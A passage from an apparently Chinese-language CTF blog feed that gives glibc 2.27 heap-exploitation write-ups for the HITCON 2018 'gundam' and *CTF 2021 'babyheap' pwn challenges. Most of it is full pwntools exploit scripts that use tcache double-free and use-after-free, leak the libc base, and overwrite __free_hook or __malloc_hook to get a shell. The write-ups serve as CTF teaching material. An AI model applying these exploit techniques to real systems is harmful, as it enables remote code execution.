class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)</span></span><br><span class="line">p=process(<span class="string">'./gundam'</span>)</span><br><span class="line">l=ELF(<span class="string">'/glibc/2.27/amd64/lib/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line">build(<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">blow_up()</span><br><span class="line">visit()</span><br><span class="line">addr = (p.recvuntil(<span class="string">"Type[7]"</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(addr)</span><br><span class="line"></span><br><span class="line">print(hex(u64(addr)))</span><br><span class="line">main_arena=u64(addr)<span class="number">-96</span></span><br><span class="line">log.info(<span class="string">'main_arene:'</span>+hex(main_arena))</span><br><span class="line">base=main_arena<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'libc_base:'</span>+hex(base))</span><br><span class="line">free_hook=base+l.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">log.info(<span class="string">'free_hook:'</span>+hex(free_hook))</span><br><span class="line">system_addr=base+l.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'system:'</span>+hex(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">blow_up()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">build(p64(system_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="远程libc基地址泄露"><a href="#远程libc基地址泄露" class="headerlink" title="远程libc基地址泄露"></a>远程libc基地址泄露</h2><p>前面，我们虽然利用题目的附件里的libc来解决<code>__free_hook</code>、<code>__malloc__hook</code>、<code>system</code>这些敏感symbols的地址的在远程环境和本地环境下偏移的差距但是libc基地址的问题依然没有解决。我们观测远程libc基地址仅仅看<code>main_arena</code>-gdb出偏移得到的地址后三位是否为0，但地址后三位是为0的地址不一定是libc基址。</p><p><img src="image-20210504003927457.png" alt="image-20210504003927457"></p><p>因为在一些附件so文件中，<code>main_arena</code>是没有的,但是有<code>__malloc_hook</code>和<code>__realloc_hook</code>。</p><p><img src="image-20210504100155315.png" alt="image-20210504100155315"></p><p>我们不可能通过<code>real_base_libc=main_arena_add-l.symbols[&#39;main_arena&#39;]</code>来获得基地址。但如果我们gdb过<code>main_arena</code>的地址和看过libc结构就可以发现<code>__malloc_hook</code>和<code>__realloc_hook</code>这两个symbols其实”挨得近”且这距离不受libc版本影响。</p><p><img src="image-20210504094456672.png" alt="image-20210504094456672"></p><p>因此我们可以通过,<code>mian_arena-0x10</code>得到<code>__malloc_hook</code>的真实地址<code>__malloc_hook_addr</code>，<code>mian_arena-0x18</code>得到<code>__realloc_hook</code>的真实地址<code>__realloc_hook_addr</code>。<code>__malloc_hook_addr-l.symbols[&quot;__malloc_hook&quot;]</code>或<code>__realloc_hook_addr-l.symbols[&quot;__realloc_hook&quot;]</code>都可以得到libc的基地址。</p><p><img src="image-20210504101842757.png" alt="image-20210504101842757"></p><p>这样我们就可以不通gdb出libc偏移，就可以得到远程libc的准确基址。</p><h2 id="无so文件推算远程地址"><a href="#无so文件推算远程地址" class="headerlink" title="无so文件推算远程地址"></a>无so文件推算远程地址</h2><p>经过上面步骤改进，我们已经能做到准确得到远程环境地址中任意敏感symbols的地址。但是，我们这过程太依赖题目附近中的so文件。so文件的准确有效性，直接影响到我推算远程地址。那么若题目给了错误的libc或题目只给了libc大版本号没有给出so文件，那还能做题吗?</p><p>回顾整个过程，在整个过程中我们最值得信任的地址就是通过<code>unsorted bin</code>得到<code>main_arena</code>的地址以及通过<code>main_arena</code>所得到的<code>__malloc_hook</code>或<code>__realloc_hook</code>的地址。这是由于这些地址是从单纯利用glibc chunk管理机制中所得到的。</p><p>再回想到，栈溢出时我们获得libc基址时我们只泄露一个函数的最低的 12 位就可以找到相应libc版本。其应用的原理是：</p><blockquote><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。<br>        即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p></blockquote><p>既然函数是libc symbols中的一种，那么<code>__malloc_hook</code>或<code>__realloc_hook</code>这些 libc中的变量能一样吗？</p><p>经过查询<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a>和测试发现<code>__malloc_hook</code>或<code>__realloc_hook</code>这些变量symbols也和函数一样被记录下来。而且:</p><p><strong>在libc中，不仅函数所有libc symbols在 libc.so 动态链接库中,相对之间相对偏移是固定的</strong>。</p><p><strong>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，所有libc symbols最低的 12 位并不会发生改变。</strong></p><p>因此我们可以向在做栈溢出一样，用LibcSearcher来找到远程libc版本，从而推算出各个敏感symbols的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">libc = LibcSearcher(<span class="string">'__malloc_hook'</span>, malloc_hook)<span class="comment">#寻找libc版本</span></span><br><span class="line">libcbase = malloc_hook - libc.dump(<span class="string">'__malloc_hook'</span>)<span class="comment">#计算基地地址</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)<span class="comment">#计算system函数地址</span></span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line"></span><br><span class="line">free_hook=libcbase+libc.dump(<span class="string">'__free_hook'</span>)<span class="comment">#计算__free_hook变量地址</span></span><br><span class="line">log.info(<span class="string">'libcbase+free_hook:'</span>+hex(libcbase+libc.dump(<span class="string">'__free_hook'</span>)))</span><br></pre></td></tr></table></figure><h2 id="2018-HitCon-Pwn-gundam-远程exp"><a href="#2018-HitCon-Pwn-gundam-远程exp" class="headerlink" title="2018-HitCon-Pwn-gundam 远程exp"></a>2018-HitCon-Pwn-gundam 远程exp</h2><p>综上，我们可以利用这些tirck做出一些“阴间环境”的堆题，2018-HitCon-Pwn-gundam就是其中一道（笑）</p><p><img src="buu_gundam.png" alt="image-20210504112333320"></p><p>由于libc不准确，在buu上题目做出人很少。我们可以用我们上面用到的方法找与题目相匹配的libc。从而解决题目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25457</span>)</span><br><span class="line"><span class="comment">#p=process('./gundam')</span></span><br><span class="line"><span class="comment">#l=ELF('./libc.so.6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">blow_up()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">visit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Gundam[7] :aaaaaaaa'</span>)</span><br><span class="line">addr=p.recv()[<span class="number">1</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">x=int(hex(u64(addr))+<span class="string">'40'</span>,<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'main_arena:'</span>+hex(x))</span><br><span class="line"></span><br><span class="line">malloc_hook=x<span class="number">-0x10</span></span><br><span class="line">log.info(<span class="string">'malloc_hook:'</span>+hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'__malloc_hook'</span>, malloc_hook)</span><br><span class="line">libcbase = malloc_hook - libc.dump(<span class="string">'__malloc_hook'</span>)</span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line"></span><br><span class="line">free_hook=libcbase+libc.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+free_hook:'</span>+hex(libcbase+libc.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">blow_up()</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">build(p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>找到与远程相匹配的libc，就可以得到flag。</p><p><img src="gundam_2.png" alt="image-20210504112951072"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021*CTF_PWN_babyheap复现记</title>
      <link href="/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/"/>
      <url>/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近查阅了很多关于堆的资料，也做了很多关于堆的题。慢慢开始回顾下那年没有被啃动的pwn 堆题。</p><p>babyheap是当时*CTF 2021中最简单的pwn，但是当时做堆还一窍不通，一直搞不懂堆的机制关系。如今再细细分析发现还挺有意思的。<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目保护全开:</p><p>分析逆向后的代码可以看到:</p><p>add 函数限制了我们只能申请0x20~0x70大小的chunk(刚开始没有反映过来0x60&gt;0x60的结果为false),且只能申请15个.</p><p><img src="image-20210427214048652.png" alt="image-20210427214048652"></p><p>edit和delete在调有时看起来只要pools有值就可以free后依然可以调用.在delete时,在add中所创造的pools[v1]与sizes[v1]在,没有新的值覆盖下不会被清空的.这样我们可以在一个chunk free后依然可以操控.</p><p><img src="image-20210427213937736.png" alt="image-20210427213937736"></p><p><img src="image-20210427214135176.png" alt="image-20210427214135176"></p><p>在leaveYouname函数中,会创造一个大的chunk 会触发<code>_int_malloc</code>中的<code>malloc_consolidate</code>进行fast bin的合并.但该函数只能运行一次.</p><p><img src="image-20210427214211389.png" alt="image-20210427214211389"></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>由于chunk free后加入bins fd指针起到重要的作用,但是edit限制了我们修改fd.</p><p>但分析过程可以得知我们可以先填满Tcache,然后创造几个fast bin,然后利用leaveYouname进行合并,从而得到一个smallbins从而泄露出libc的基地址.</p><p><img src="image-20210427222140086.png" alt="image-20210427222140086"></p><p>由于,在有tache bin 与small bins下我们申请malloc 一个chunk,程序会先对tache bin中的chunk 进行查询再从samllbins切割分配.我们可以创造几个大小合理且不在tache bin中的chunk,从而让程序分配切割smallbins。</p><p><img src="image-20210427224028856.png" alt="image-20210427224028856"></p><p>同时，我们再利用free后依然可以调用edit的特性，修改新分配再释放的chunk的fd。</p><p>这里有个特性：加入tachebins 后，tachebins 没有在它出去时，检查地址对于’chunk’的size是否还是加入时的大小和地址。导致tachbins里地址可以被窜改后，然后取出时分配到窜改后的地址的地方。（ps：tachbins 存放的是chunk 内容的地址）</p><p><img src="image-20210427224943217.png" alt="image-20210427224943217"></p><p>我们可以将<code>__malloc_hook</code>-0x10的地址从而得到<code>__malloc_hook</code>和<code>__realloc_hook</code>写的权利，修改写入one_gadget和<code>__libc_realloc</code>调节，从而得到shell。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'/glibc/2.27/amd64/lib/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./1pwn'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'input size'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'input content'</span>)</span><br><span class="line">p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaveYourName</span><span class="params">(text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your name:'</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showYourName</span><span class="params">(text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x59</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'wwww\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'wwww\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x59</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x58</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x59</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x28</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">leaveYourName(<span class="string">'k'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">caddr=u64(p.recvuntil(<span class="string">'\x55'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x970</span><span class="comment"># 本来想直接给tachet结果发现搞复杂了</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">':'</span>+hex(caddr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">base=addr<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">'1111'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'__malloc_hook:'</span>+hex(base))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x21</span>)+p64(base+e.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">11</span>,<span class="string">'kkkk'</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x41612 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x41666 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdeed2 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">edit(<span class="number">12</span>,p64(base+<span class="number">0xdeed2</span>)+p64(base+e.symbols[<span class="string">'__libc_realloc'</span>]+<span class="number">4</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Glibc-2-27关于Tcache的增强保护"><a href="#Glibc-2-27关于Tcache的增强保护" class="headerlink" title="Glibc 2.27关于Tcache的增强保护"></a>Glibc 2.27关于Tcache的增强保护</h2><p>查询wp后才知道，这题是考在2020年09月10日Ubuntu基金更新的名为2.27-3ubuntu1.3的libc。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">        